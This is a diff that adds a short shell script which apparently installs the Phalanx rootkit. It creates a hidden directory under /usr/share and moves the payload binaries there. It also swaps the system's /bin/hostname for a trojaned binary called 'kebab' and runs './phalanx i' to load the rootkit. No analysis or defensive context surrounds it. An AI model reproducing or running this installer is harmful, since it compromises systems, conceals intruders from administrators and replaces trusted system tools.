@@ -1,0 +1,12 @@
+#!/bin/sh
+mkdir /usr/share/.home.ph1
+mv cb /usr/share/.home.ph1
+mkdir /usr/share/.home.ph1/tty
+chmod 755 /usr/share/.home.ph1
+chmod 777 /usr/share/.home.ph1/tty
+cp /etc/hostname /etc/host.ph1
+#ugh i really gotta fix this
+cp /bin/hostname /bin/host.ph1
+mv kebab /bin/hostname
+./phalanx i
+mv phalanx /usr/share/.home.ph1
